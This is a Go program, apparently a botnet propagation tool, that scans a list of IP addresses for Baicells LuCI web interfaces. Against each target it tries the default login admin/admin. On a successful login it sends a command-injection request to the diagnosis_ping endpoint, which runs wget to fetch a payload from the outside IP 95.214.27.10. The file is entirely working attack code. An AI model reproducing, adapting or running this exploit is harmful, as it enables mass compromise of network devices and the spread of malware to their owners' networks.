package main

import (
    "bufio"
    "fmt"
    "net/http"
    "os"
    "strings"
    "time"
    "crypto/tls"
    "net"
    "sync"
)

func main() {

    file, err := os.Open("ips.txt")
    if err != nil {
        fmt.Println("Error opening ips.txt:", err)
        return
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)

    var wg sync.WaitGroup

    maxGoroutines := 50
    sem := make(chan struct{}, maxGoroutines)

    for scanner.Scan() {
        ipPortString := strings.TrimSpace(scanner.Text())

        // Acquire a semaphore slot
        sem <- struct{}{}

        wg.Add(1)

        go func(ipPortString string) {
            defer func() {

                <-sem

                wg.Done()
            }()

            timeout := 5 * time.Second

            client := &http.Client{
                Timeout: timeout,
                Transport: &http.Transport{
                    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                CheckRedirect: func(req *http.Request, via []*http.Request) error {
                    return http.ErrUseLastResponse
                },
            }

            requestData := "luci_username=admin&luci_password=admin"
            requestHeaders := map[string]string{
                "Host":                     ipPortString,
                "Content-Length":           "39",
                "Cache-Control":            "max-age=0",
                "Sec-Ch-Ua":                "\"Chromium\";v=\"117\", \"Not;A=Brand\";v=\"8\"",
                "Sec-Ch-Ua-Mobile":         "?0",
                "Sec-Ch-Ua-Platform":       "\"Windows\"",
                "Upgrade-Insecure-Requests": "1",
                "Origin":                   "https://" + ipPortString,
                "Content-Type":             "application/x-www-form-urlencoded",
                "User-Agent":               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
                "Accept":                   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site":           "same-origin",
                "Sec-Fetch-Mode":           "navigate",
                "Sec-Fetch-User":           "?1",
                "Sec-Fetch-Dest":           "document",
                "Referer":                  "https://" + ipPortString + "/cgi-bin/luci",
                "Accept-Encoding":          "gzip, deflate, br",
                "Accept-Language":          "en-US,en;q=0.9",
                "Connection":               "close",
            }

            requestBody := strings.NewReader(requestData)

            requestURL := "https://" + ipPortString + "/cgi-bin/luci"
            req, err := http.NewRequest("POST", requestURL, requestBody)
            if err != nil {
                //fmt.Printf("Error creating request for %s: %v\n", ipPortString, err)
                return
            }

            for key, value := range requestHeaders {
                req.Header.Set(key, value)
            }

            response, err := client.Do(req)
            if err != nil {
                if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
                    //fmt.Printf("Timeout connecting to %s\n", ipPortString)
                    return
                }
                //fmt.Printf("Error sending request to %s: %v\n", ipPortString, err)
                return
            }
            defer response.Body.Close()

            setCookieHeader := response.Header.Get("Set-Cookie")
            locationHeader := response.Header.Get("Location")
            if setCookieHeader != "" {

                sysauthValue := extractCookieValue(setCookieHeader, "sysauth")
                fmt.Printf("[baicells] login successful for: %s, sysauth: %s\n", ipPortString, sysauthValue)

                stokValue := extractStokFromLocation(locationHeader)
                fmt.Printf("stok: %s\n", stokValue)

                sendGETRequest(ipPortString, sysauthValue, stokValue)
            } else {
                //fmt.Printf("Login Failed for: %s\n", ipPortString)
            }
        }(ipPortString)
    }

    wg.Wait()
}

func extractCookieValue(setCookieHeader, cookieName string) string {
    cookies := strings.Split(setCookieHeader, ";")
    for _, cookie := range cookies {
        parts := strings.Split(strings.TrimSpace(cookie), "=")
        if len(parts) == 2 && parts[0] == cookieName {
            return parts[1]
        }
    }
    return ""
}

func extractStokFromLocation(locationHeader string) string {
    parts := strings.Split(locationHeader, ";stok=")
    if len(parts) == 2 {
        return parts[1]
    }
    return ""
}

func sendGETRequest(ipPortString, sysauthValue, stokValue string) {

    getRequestURL := fmt.Sprintf("https://%s/cgi-bin/luci/;stok=%s/admin/system/diagnosis_ping?IPAddr=1.1.1.1&Size=64`wget+http://95.214.27.10/magic`&Timeout=10&interface=default&Count=4&_=0.4044032183131234", ipPortString, stokValue)
    getRequestHeaders := map[string]string{
        "Host":              ipPortString,
        "Cookie":            "sysauth=" + sysauthValue,
        "Sec-Ch-Ua":         "\"Chromium\";v=\"117\", \"Not;A=Brand\";v=\"8\"",
        "Sec-Ch-Ua-Mobile":  "?0",
        "User-Agent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Accept":            "*/*",
        "Sec-Fetch-Site":    "same-origin",
        "Sec-Fetch-Mode":    "cors",
        "Sec-Fetch-Dest":    "empty",
        "Referer":           "https://" + ipPortString + "/cgi-bin/luci/;stok=" + stokValue + "/admin/system/diagnosis",
        "Accept-Encoding":   "gzip, deflate, br",
        "Accept-Language":   "en-US,en;q=0.9",
        "Connection":        "close",
    }

    client := &http.Client{
        Timeout: 20 * time.Second,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
    }

    req, err := http.NewRequest("GET", getRequestURL, nil)
    if err != nil {
        //fmt.Printf("Error creating GET request for %s: %v\n", ipPortString, err)
        return
    }

    for key, value := range getRequestHeaders {
        req.Header.Set(key, value)
    }

    response, err := client.Do(req)
    if err != nil {
        //fmt.Printf("Error sending GET request to %s: %v\n", ipPortString, err)
        return
    }
    defer response.Body.Close()

    fmt.Printf("[baicells] payload successfully sent to: %s:\n", ipPortString)
    fmt.Println("", response.Status)
    fmt.Println("")
    for key, values := range response.Header {
        for _, value := range values {
            fmt.Printf("%s: %s\n", key, value)
        }
    }
}
